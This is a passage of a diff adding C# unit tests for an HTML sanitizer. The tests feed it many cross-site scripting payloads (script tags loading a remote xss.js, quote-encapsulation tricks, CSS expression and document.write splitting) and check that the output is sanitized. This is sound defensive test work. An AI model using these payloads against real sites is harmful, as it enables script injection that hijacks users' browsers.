+            Dictionary<string, string[]> elementWhiteList = CreateElementWhiteList();
+            Dictionary<string, string[]> attributeWhiteList = CreateAttributeWhiteList();
+
+            // Act
+            string htmlFragment = "<Div style=\"background-color: expression(<SCRIPT a=\">\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>)\">";
+            string actual = target.GetSafeHtmlFragment(htmlFragment, elementWhiteList, attributeWhiteList);
+
+            // Assert
+            string expected = "<Div style=\"background-color:(&lt;a=\">\" SRC=\"http://ha.ckers.org/xss.js\">)\"></Div>";
+            Assert.AreEqual(expected, actual, true);
+        }
+
+        /// <summary>
+        /// A test for AnchorTag with Html Quotes Encapsulation 2 xss
+        /// Example <!-- <A HREF="http://www.codeplex.com?url=<SCRIPT =">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>">XSS</A> -->
+        /// </summary>   
+        [TestMethod()]
+        public void AnchorTagHtmlQuotesEncapsulation2XSSTest()
+        {
+            // Arrange
+            HtmlAgilityPackSanitizerProvider target = new HtmlAgilityPackSanitizerProvider();
+            Dictionary<string, string[]> elementWhiteList = CreateElementWhiteList();
+            Dictionary<string, string[]> attributeWhiteList = CreateAttributeWhiteList();
+
+            // Act
+            string htmlFragment = "<A HREF=\"http://www.codeplex.com?url=<SCRIPT =\">\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>\">XSS</A>";
+            string actual = target.GetSafeHtmlFragment(htmlFragment, elementWhiteList, attributeWhiteList);
+
+            // Assert
+            string expected = "<A HREF=\"http://www.codeplex.com?url=&lt;=\">\" SRC=\"http://ha.ckers.org/xss.js\">\">XSS</A>";
+            Assert.AreEqual(expected, actual, true);
+        }
+
+        /// <summary>
+        /// A test for Div with Html Quotes Encapsulation 2 xss
+        /// Example <!-- <Div style="background-color: http://www.codeplex.com?url=<SCRIPT =">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>"> -->
+        /// </summary>   
+        [TestMethod()]
+        public void DivHtmlQuotesEncapsulation2XSSTest()
+        {
+            // Arrange
+            HtmlAgilityPackSanitizerProvider target = new HtmlAgilityPackSanitizerProvider();
+            Dictionary<string, string[]> elementWhiteList = CreateElementWhiteList();
+            Dictionary<string, string[]> attributeWhiteList = CreateAttributeWhiteList();
+
+            // Act
+            string htmlFragment = "<Div style=\"background-color: http://www.codeplex.com?url=<SCRIPT =\">\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>\">";
+            string actual = target.GetSafeHtmlFragment(htmlFragment, elementWhiteList, attributeWhiteList);
+
+            // Assert
+            string expected = "<Div style=\"background-color: http://www.codeplex.com?url=&lt;=\">\" SRC=\"http://ha.ckers.org/xss.js\">\"></Div>";
+            Assert.AreEqual(expected, actual, true);
+        }
+
+        /// <summary>
+        /// A test for Div with style expression and Html Quotes Encapsulation 2 xss
+        /// Example <!-- <Div style="background-color: expression(<SCRIPT =">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>)"> -->
+        /// </summary>   
+        [TestMethod()]
+        public void DivStyleExpressionHtmlQuotesEncapsulation2XSSTest()
+        {
+            // Arrange
+            HtmlAgilityPackSanitizerProvider target = new HtmlAgilityPackSanitizerProvider();
+            Dictionary<string, string[]> elementWhiteList = CreateElementWhiteList();
+            Dictionary<string, string[]> attributeWhiteList = CreateAttributeWhiteList();
+
+            // Act
+            string htmlFragment = "<Div style=\"background-color: expression(<SCRIPT =\">\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>)\">";
+            string actual = target.GetSafeHtmlFragment(htmlFragment, elementWhiteList, attributeWhiteList);
+
+            // Assert
+            string expected = "<Div style=\"background-color:(&lt;=\">\" SRC=\"http://ha.ckers.org/xss.js\">)\"></Div>";
+            Assert.AreEqual(expected, actual, true);
+        }
+
+        /// <summary>
+        /// A test for AnchorTag with Html Quotes Encapsulation 3 xss
+        /// Example <!-- <A HREF="http://www.codeplex.com?url=<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>">XSS</A> -->
+        /// </summary>   
+        [TestMethod()]
+        public void AnchorTagHtmlQuotesEncapsulation3XSSTest()
+        {
+            // Arrange
+            HtmlAgilityPackSanitizerProvider target = new HtmlAgilityPackSanitizerProvider();
+            Dictionary<string, string[]> elementWhiteList = CreateElementWhiteList();
+            Dictionary<string, string[]> attributeWhiteList = CreateAttributeWhiteList();
+
+            // Act
+            string htmlFragment = "<A HREF=\"http://www.codeplex.com?url=<SCRIPT a=\">\" '' SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>\">XSS</A>";
+            string actual = target.GetSafeHtmlFragment(htmlFragment, elementWhiteList, attributeWhiteList);
+
+            // Assert
+            string expected = "<A HREF=\"http://www.codeplex.com?url=&lt;a=\">\" '' SRC=\"http://ha.ckers.org/xss.js\">\">XSS</A>";
+            Assert.AreEqual(expected, actual, true);
+        }
+
+        /// <summary>
+        /// A test for Div with Html Quotes Encapsulation 3 xss
+        /// Example <!-- <Div style="background-color: http://www.codeplex.com?url=<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>"> -->
+        /// </summary>   
+        [TestMethod()]
+        public void DivHtmlQuotesEncapsulation3XSSTest()
+        {
+            // Arrange
+            HtmlAgilityPackSanitizerProvider target = new HtmlAgilityPackSanitizerProvider();
+            Dictionary<string, string[]> elementWhiteList = CreateElementWhiteList();
+            Dictionary<string, string[]> attributeWhiteList = CreateAttributeWhiteList();
+
+            // Act
+            string htmlFragment = "<Div style=\"background-color: http://www.codeplex.com?url=<SCRIPT a=\" > \" '' SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>\">";
+            string actual = target.GetSafeHtmlFragment(htmlFragment, elementWhiteList, attributeWhiteList);
+
+            // Assert
+            string expected = "<Div style=\"background-color: http://www.codeplex.com?url=&lt;a=\"> \" '' SRC=\"http://ha.ckers.org/xss.js\">\"></Div>";
+            Assert.AreEqual(expected, actual, true);
+        }
+
+        /// <summary>
+        /// A test for Div with style expression and Html Quotes Encapsulation 3 xss
+        /// Example <!-- <Div style="background-color: expression(<SCRIPT a=">" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>)"> -->
+        /// </summary>   
+        [TestMethod()]
+        public void DivStyleExpressionHtmlQuotesEncapsulation3XSSTest()
+        {
+            // Arrange
+            HtmlAgilityPackSanitizerProvider target = new HtmlAgilityPackSanitizerProvider();
+            Dictionary<string, string[]> elementWhiteList = CreateElementWhiteList();
+            Dictionary<string, string[]> attributeWhiteList = CreateAttributeWhiteList();
+
+            // Act
+            string htmlFragment = "<Div style=\"background-color: expression(<SCRIPT a=\" > \" '' SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>)\">";
+            string actual = target.GetSafeHtmlFragment(htmlFragment, elementWhiteList, attributeWhiteList);
+
+            // Assert
+            string expected = "<Div style=\"background-color:(&lt;a=\"> \" '' SRC=\"http://ha.ckers.org/xss.js\">)\"></Div>";
+            Assert.AreEqual(expected, actual, true);
+        }
+
+        /// <summary>
+        /// A test for AnchorTag with Html Quotes Encapsulation 4 xss
+        /// Example <!-- <A HREF="http://www.codeplex.com?url=<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>">XSS</A> -->
+        /// </summary>   
+        [TestMethod()]
+        public void AnchorTagHtmlQuotesEncapsulation4XSSTest()
+        {
+            // Arrange
+            HtmlAgilityPackSanitizerProvider target = new HtmlAgilityPackSanitizerProvider();
+            Dictionary<string, string[]> elementWhiteList = CreateElementWhiteList();
+            Dictionary<string, string[]> attributeWhiteList = CreateAttributeWhiteList();
+
+            // Act
+            string htmlFragment = "<A HREF=\"http://www.codeplex.com?url=<SCRIPT \"a='>'\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>\">XSS</A>";
+            string actual = target.GetSafeHtmlFragment(htmlFragment, elementWhiteList, attributeWhiteList);
+
+            // Assert
+            string expected = "<A HREF=\"http://www.codeplex.com?url=&lt;\">\">XSS</A>";
+            Assert.AreEqual(expected, actual, true);
+        }
+
+        /// <summary>
+        /// A test for Div with Html Quotes Encapsulation 4 xss
+        /// Example <!-- <Div style="background-color: http://www.codeplex.com?url=<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>"> -->
+        /// </summary>   
+        [TestMethod()]
+        public void DivHtmlQuotesEncapsulation4XSSTest()
+        {
+            // Arrange
+            HtmlAgilityPackSanitizerProvider target = new HtmlAgilityPackSanitizerProvider();
+            Dictionary<string, string[]> elementWhiteList = CreateElementWhiteList();
+            Dictionary<string, string[]> attributeWhiteList = CreateAttributeWhiteList();
+
+            // Act
+            string htmlFragment = "<Div style=\"background-color: http://www.codeplex.com?url=<SCRIPT \"a='>'\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>\">";
+            string actual = target.GetSafeHtmlFragment(htmlFragment, elementWhiteList, attributeWhiteList);
+
+            // Assert
+            string expected = "<Div style=\"background-color: http://www.codeplex.com?url=&lt;\">\"></Div>";
+            Assert.AreEqual(expected, actual, true);
+        }
+
+        /// <summary>
+        /// A test for Div with style expression and Html Quotes Encapsulation 4 xss
+        /// Example <!-- <Div style="background-color: expression(<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>)"> -->
+        /// </summary>   
+        [TestMethod()]
+        public void DivStyleExpressionHtmlQuotesEncapsulation4XSSTest()
+        {
+            // Arrange
+            HtmlAgilityPackSanitizerProvider target = new HtmlAgilityPackSanitizerProvider();
+            Dictionary<string, string[]> elementWhiteList = CreateElementWhiteList();
+            Dictionary<string, string[]> attributeWhiteList = CreateAttributeWhiteList();
+
+            // Act
+            string htmlFragment = "<Div style=\"background-color: expression(<SCRIPT \"a='>'\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>)\">";
+            string actual = target.GetSafeHtmlFragment(htmlFragment, elementWhiteList, attributeWhiteList);
+
+            // Assert
+            string expected = "<Div style=\"background-color:(&lt;\">)\"></Div>";
+            Assert.AreEqual(expected, actual, true);
+        }
+
+        /// <summary>
+        /// A test for AnchorTag with Html Quotes Encapsulation 5 xss
+        /// Example <!-- <A HREF="http://www.codeplex.com?url=<SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>">XSS</A> -->
+        /// </summary>   
+        [TestMethod()]
+        public void AnchorTagHtmlQuotesEncapsulation5XSSTest()
+        {
+            // Arrange
+            HtmlAgilityPackSanitizerProvider target = new HtmlAgilityPackSanitizerProvider();
+            Dictionary<string, string[]> elementWhiteList = CreateElementWhiteList();
+            Dictionary<string, string[]> attributeWhiteList = CreateAttributeWhiteList();
+
+            // Act
+            string htmlFragment = "<A HREF=\"http://www.codeplex.com?url=<SCRIPT a=`>` SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>\">XSS</A>";
+            string actual = target.GetSafeHtmlFragment(htmlFragment, elementWhiteList, attributeWhiteList);
+
+            // Assert
+            string expected = "<A HREF=\"http://www.codeplex.com?url=&lt;a=`&gt;` SRC=\">\">XSS</A>";
+            Assert.AreEqual(expected, actual, true);
+        }
+
+        /// <summary>
+        /// A test for Div with Html Quotes Encapsulation 5 xss
+        /// Example <!-- <Div style="background-color: http://www.codeplex.com?url=<SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>"> -->
+        /// </summary>   
+        [TestMethod()]
+        public void DivHtmlQuotesEncapsulation5XSSTest()
+        {
+            // Arrange
+            HtmlAgilityPackSanitizerProvider target = new HtmlAgilityPackSanitizerProvider();
+            Dictionary<string, string[]> elementWhiteList = CreateElementWhiteList();
+            Dictionary<string, string[]> attributeWhiteList = CreateAttributeWhiteList();
+
+            // Act
+            string htmlFragment = "<Div style=\"background-color: http://www.codeplex.com?url=<SCRIPT a=`>` SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>\">";
+            string actual = target.GetSafeHtmlFragment(htmlFragment, elementWhiteList, attributeWhiteList);
+
+            // Assert
+            string expected = "<Div style=\"background-color: http://www.codeplex.com?url=&lt;a=`&gt;` SRC=\">\"></Div>";
+            Assert.AreEqual(expected, actual, true);
+        }
+
+        /// <summary>
+        /// A test for Div with style expression and Html Quotes Encapsulation 5 xss
+        /// Example <!-- <Div style="background-color: expression(<SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>)"> -->
+        /// </summary>   
+        [TestMethod()]
+        public void DivStyleExpressionHtmlQuotesEncapsulation5XSSTest()
+        {
+            // Arrange
+            HtmlAgilityPackSanitizerProvider target = new HtmlAgilityPackSanitizerProvider();
+            Dictionary<string, string[]> elementWhiteList = CreateElementWhiteList();
+            Dictionary<string, string[]> attributeWhiteList = CreateAttributeWhiteList();
+
+            // Act
+            string htmlFragment = "<Div style=\"background-color: expression(<SCRIPT a=`>` SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>)\">";
+            string actual = target.GetSafeHtmlFragment(htmlFragment, elementWhiteList, attributeWhiteList);
+
+            // Assert
+            string expected = "<Div style=\"background-color:(&lt;a=`&gt;` SRC=\">)\"></Div>";
+            Assert.AreEqual(expected, actual, true);
+        }
+
+        /// <summary>
+        /// A test for AnchorTag with Html Quotes Encapsulation 6 xss
+        /// Example <!-- <A HREF="http://www.codeplex.com?url=<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>">XSS</A> -->
+        /// </summary>   
+        [TestMethod()]
+        public void AnchorTagHtmlQuotesEncapsulation6XSSTest()
+        {
+            // Arrange
+            HtmlAgilityPackSanitizerProvider target = new HtmlAgilityPackSanitizerProvider();
+            Dictionary<string, string[]> elementWhiteList = CreateElementWhiteList();
+            Dictionary<string, string[]> attributeWhiteList = CreateAttributeWhiteList();
+
+            // Act
+            string htmlFragment = "<A HREF=\"http://www.codeplex.com?url=<SCRIPT a=\">'>\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>\">XSS</A>";
+            string actual = target.GetSafeHtmlFragment(htmlFragment, elementWhiteList, attributeWhiteList);
+
+            // Assert
+            string expected = "<A HREF=\"http://www.codeplex.com?url=&lt;a=\">'>\" SRC=\"http://ha.ckers.org/xss.js\">\">XSS</A>";
+            Assert.AreEqual(expected, actual, true);
+        }
+
+        /// <summary>
+        /// A test for Div with Html Quotes Encapsulation 6 xss
+        /// Example <!-- <Div style="background-color: http://www.codeplex.com?url=<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>"> -->
+        /// </summary>   
+        [TestMethod()]
+        public void DivHtmlQuotesEncapsulation6XSSTest()
+        {
+            // Arrange
+            HtmlAgilityPackSanitizerProvider target = new HtmlAgilityPackSanitizerProvider();
+            Dictionary<string, string[]> elementWhiteList = CreateElementWhiteList();
+            Dictionary<string, string[]> attributeWhiteList = CreateAttributeWhiteList();
+
+            // Act
+            string htmlFragment = "<Div style=\"background-color: http://www.codeplex.com?url=<SCRIPT a=\">'>\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>\">";
+            string actual = target.GetSafeHtmlFragment(htmlFragment, elementWhiteList, attributeWhiteList);
+
+            // Assert
+            string expected = "<Div style=\"background-color: http://www.codeplex.com?url=&lt;a=\">'>\" SRC=\"http://ha.ckers.org/xss.js\">\"></Div>";
+            Assert.AreEqual(expected, actual, true);
+        }
+
+        /// <summary>
+        /// A test for Div with style expression and Html Quotes Encapsulation 6 xss
+        /// Example <!-- <Div style="background-color: expression(<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>)"> -->
+        /// </summary>   
+        [TestMethod()]
+        public void DivStyleExpressionHtmlQuotesEncapsulation6XSSTest()
+        {
+            // Arrange
+            HtmlAgilityPackSanitizerProvider target = new HtmlAgilityPackSanitizerProvider();
+            Dictionary<string, string[]> elementWhiteList = CreateElementWhiteList();
+            Dictionary<string, string[]> attributeWhiteList = CreateAttributeWhiteList();
+
+            // Act
+            string htmlFragment = "<Div style=\"background-color: expression(<SCRIPT a=\">'>\" SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>)\">";
+            string actual = target.GetSafeHtmlFragment(htmlFragment, elementWhiteList, attributeWhiteList);
+
+            // Assert
+            string expected = "<Div style=\"background-color:(&lt;a=\">'>\" SRC=\"http://ha.ckers.org/xss.js\">)\"></Div>";
+            Assert.AreEqual(expected, actual, true);
+        }
+
+        /// <summary>
+        /// A test for AnchorTag with Html Quotes Encapsulation 7 xss
+        /// Example <!-- <A HREF="http://www.codeplex.com?url=<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>">XSS</A> -->
+        /// </summary>   
+        [TestMethod()]
+        public void AnchorTagHtmlQuotesEncapsulation7XSSTest()
+        {
+            // Arrange
+            HtmlAgilityPackSanitizerProvider target = new HtmlAgilityPackSanitizerProvider();
+            Dictionary<string, string[]> elementWhiteList = CreateElementWhiteList();
+            Dictionary<string, string[]> attributeWhiteList = CreateAttributeWhiteList();
+
+            // Act
+            string htmlFragment = "<A HREF=\"http://www.codeplex.com?url=<SCRIPT>document.write(\"<SCRI\");</SCRIPT>PT SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>\">XSS</A>";
+            string actual = target.GetSafeHtmlFragment(htmlFragment, elementWhiteList, attributeWhiteList);
+
+            // Assert
+            string expected = "<A HREF=\"http://www.codeplex.com?url=&lt;&gt;document.write(\"></a>PT SRC=\"http://ha.ckers.org/xss.js\">\">XSS";
+            Assert.AreEqual(expected, actual, true);
+        }
+
+        /// <summary>
+        /// A test for Div with Html Quotes Encapsulation 7 xss
+        /// Example <!-- <Div style="background-color: http://www.codeplex.com?url=<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>"> -->
+        /// </summary>   
+        [TestMethod()]
+        public void DivHtmlQuotesEncapsulation7XSSTest()
+        {
+            // Arrange
+            HtmlAgilityPackSanitizerProvider target = new HtmlAgilityPackSanitizerProvider();
+            Dictionary<string, string[]> elementWhiteList = CreateElementWhiteList();
+            Dictionary<string, string[]> attributeWhiteList = CreateAttributeWhiteList();
+
+            // Act
+            string htmlFragment = "<Div style=\"background-color: http://www.codeplex.com?url=<SCRIPT>document.write(\"<SCRI\");</SCRIPT>PT SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>\">";
+            string actual = target.GetSafeHtmlFragment(htmlFragment, elementWhiteList, attributeWhiteList);
+
+            // Assert
+            string expected = "<Div style=\"background-color: http://www.codeplex.com?url=&lt;&gt;document.write(\"></div>PT SRC=\"http://ha.ckers.org/xss.js\">\">";
+            Assert.AreEqual(expected, actual, true);
+        }
+
+        /// <summary>
+        /// A test for Div with style expression and Html Quotes Encapsulation 7 xss
+        /// Example <!-- <Div style="background-color: expression(<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>)"> -->
+        /// </summary>   
+        [TestMethod()]
+        public void DivStyleExpressionHtmlQuotesEncapsulation7XSSTest()
+        {
+            // Arrange
+            HtmlAgilityPackSanitizerProvider target = new HtmlAgilityPackSanitizerProvider();
+            Dictionary<string, string[]> elementWhiteList = CreateElementWhiteList();
+            Dictionary<string, string[]> attributeWhiteList = CreateAttributeWhiteList();
+
+            // Act
+            string htmlFragment = "<Div style=\"background-color: expression(<SCRIPT>document.write(\"<SCRI\");</SCRIPT>PT SRC=\"http://ha.ckers.org/xss.js\"></SCRIPT>)\">";
+            string actual = target.GetSafeHtmlFragment(htmlFragment, elementWhiteList, attributeWhiteList);
+
+            // Assert
+            string expected = "<Div style=\"background-color:(&lt;&gt;document.write(\"></div>PT SRC=\"http://ha.ckers.org/xss.js\">)\">";
+            Assert.AreEqual(expected, actual, true);
+        }
 
         #region private methods
 
